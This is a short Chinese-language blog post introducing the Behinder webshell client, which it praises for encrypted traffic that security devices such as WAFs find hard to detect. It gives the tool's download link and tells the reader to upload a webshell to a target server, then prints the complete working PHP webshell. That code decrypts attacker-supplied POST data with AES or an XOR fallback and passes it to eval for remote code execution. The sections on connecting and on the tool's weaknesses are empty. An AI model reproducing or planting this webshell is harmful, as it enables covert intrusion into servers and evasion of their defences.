---
layout: post
title: 冰蝎基础使用
categories: [安全工具]
description: 冰蝎基础使用资料
keywords: 安全工具 
---

# 冰蝎基础使用
  Webshell 客户端。流量动态加密，攻击特征安全设备（WAF、WebIDS)难检测。

  通讯加密方式: `AES`（高级加密算法，对称加密，微信小程序使用此种方法）

## 下载安装

环境需求:

> java6 以上环境

下载地址:

[冰蝎](https://github.com/rebeyond/Behinder/releases)

1. 下载 `Behinder_v3.0_Beta_9_fixed.zip`
2. 双击 `Behinder` 即可打开



## 使用方式

### 使用前提

- 上传木马
- 获取木马路径和拥有访问权限

### 1. 上传木马

通过文件上传，上传冰蝎马到目标服务器

例如：

上传文件 `shell.php` 到 PHP 服务器路径下：  

> 连接密码: pass


```shell
<?php
@error_reporting(0);
session_start();
if (isset($_GET['pass']))
{
    $key=substr(md5(uniqid(rand())),16);
    $_SESSION['k']=$key;
    print $key;
}
else
{
    $key=$_SESSION['k'];
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __construct($p) {eval($p."");}}
	@new C($params);
}
?>

```


### 2. 冰蝎连接



## 冰蝎的缺点

## 参考


https://blog.csdn.net/qq_42342141/article/details/105725044